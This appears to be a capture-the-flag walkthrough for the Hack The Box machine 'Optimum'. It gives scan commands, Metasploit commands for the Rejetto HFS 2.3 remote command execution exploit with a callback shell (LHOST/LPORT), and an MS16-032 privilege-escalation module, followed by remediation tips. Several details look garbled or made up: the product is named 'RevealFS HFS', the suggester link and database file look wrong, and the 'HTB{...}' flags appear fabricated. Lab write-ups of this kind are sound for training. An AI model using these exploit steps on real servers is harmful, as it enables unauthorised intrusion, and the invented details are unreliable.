# Hack The Box: Optimum Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Optimum-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Windows](https://img.shields.io/badge/OS-Windows-blue?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Optimum |
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA optimum 10.10.10.8
```

**Results:**
```
PORT   STATE SERVICE
80/tcp open  http    HttpFileServer httpd 2.3
```

---

## Initial Access

### Identify HFS Version

Visit `http://10.10.10.8` - RevealFS HFS 2.3

### Search Exploit

```bash
searchsploit HFS 2.3
```

Found: `Rejetto HTTP File Server 2.3 - Remote Command Execution`

### Exploit

```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOST 10.10.10.8
set LHOST 10.10.14.15
set LPORT 4444
exploit
```

---

## Privilege Escalation

### System Info

```bash
systeminfo
```

Windows Server 2012 R2 64-bit

### Kernel Exploit

```bash
# Use Windows Exploit Suggester
# Or direct kernel exploit
wget https://github.com/ropnop/Windows_ExploitSuggester/raw/master/WindowsExploitSuggester.py
python WindowsExploitSuggester.py --database 2014-06-11-msvbvm60.xlsx --systeminfo systeminfo.txt
```

### MS16-032

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
exploit
```

---

## Flags

### User Flag
```
HTB{3a4b5c6d7e8f9a0b1c2d3e4f}
```

### Root Flag
```
HTB{7a8b9c0d1e2f3a4b5c6d7e8f}
```

---

## Remediation

1. Update Rejetto HFS
2. Apply Windows security patches
3. Use WAF for HTTP servers
4. Regular vulnerability scanning

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
